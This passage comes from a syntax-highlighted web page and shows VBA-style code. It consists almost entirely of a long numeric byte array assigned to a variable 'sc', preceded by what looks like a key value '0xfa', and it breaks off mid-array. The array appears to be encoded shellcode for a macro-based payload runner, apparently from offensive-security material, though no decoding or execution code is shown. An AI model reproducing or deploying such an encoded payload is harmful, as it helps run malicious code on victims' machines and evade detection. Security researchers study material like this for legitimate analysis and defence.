class="token number" style="color:#36acaa">0xfa</span><span class="token plain">&#x27;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    sc </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">Array</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">204</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">144</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">233</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">97</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">48</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">120</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">6</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">80</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">226</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">28</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">237</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">51</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">241</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">131</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">234</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">98</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">116</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">237</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">51</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">36</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">243</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">20</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">73</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">135</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">105</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">214</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">122</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">94</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">87</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">161</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">156</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">68</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">7</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">29</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">50</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">84</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">70</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">160</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">255</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">117</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">103</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">166</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">121</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">13</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">137</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">51</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">103</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">243</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">52</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">113</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">187</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">58</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">90</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">96</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">224</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">243</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">38</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">25</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">181</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">184</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">18</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">45</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">49</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">168</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">54</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">234</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">120</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">96</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">237</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">57</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">16</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">121</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">181</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">228</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">249</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">12</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">90</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">40</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">187</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> _</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">76</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">237</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">96</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">230</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">73</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">153</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">80</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">240</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">212</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">167</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">174</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">61</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">121</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">161</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">89</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">208</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">13</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">146</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">98</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">77</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">128</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">93</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">28</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">20</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">13</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">134</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">57</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">187</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">32</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">66</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">96</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">227</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">30</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">237</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">109</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">123</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">243</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">62</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">125</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">49</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">171</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">237</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">101</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">187</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">121</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">182</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">232</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">116</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">92</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">66</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">58</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">107</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">25</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">63</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">59</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">97</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">135</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">134</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">57</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">111</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">34</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">237</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">115</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">217</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">248</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">153</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">158</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">207</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">37</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">14</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">82</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">2</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">120</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">102</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">9</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">71</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">11</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">84</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">62</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">100</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> _</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">16</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">42</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">22</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">22</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">127</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">239</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">137</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">207</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">168</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">222</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">241</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">49</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">120</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">102</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">72</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">244</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">44</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">54</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">9</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">25</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">248</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">13</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">97</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">207</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">173</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">12</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">107</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">88</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">184</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">206</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">76</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">239</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">16</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">100</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">97</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">49</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">195</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">239</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">135</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">96</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">40</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">54</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">49</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">112</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">40</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">38</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">49</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">88</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">146</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">105</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">190</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">208</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">135</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">179</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">246</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">90</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">104</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">48</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">54</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">88</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">225</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">195</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">21</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">81</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">135</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">179</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">228</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">240</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">12</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">108</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">158</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">126</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">112</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">19</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">141</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">216</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">31</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">102</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">97</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">48</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> _</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">18</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">102</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">11</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">52</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">46</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">49</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">9</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">50</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">161</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">174</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">62</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">207</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">173</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">229</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">153</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">48</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">6</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">80</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">234</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">6</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">18</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">38</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">9</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">48</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">104</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">102</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">97</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">102</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">18</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">102</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">9</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">104</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">220</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">53</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">132</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">207</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">173</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">245</span><span class="token 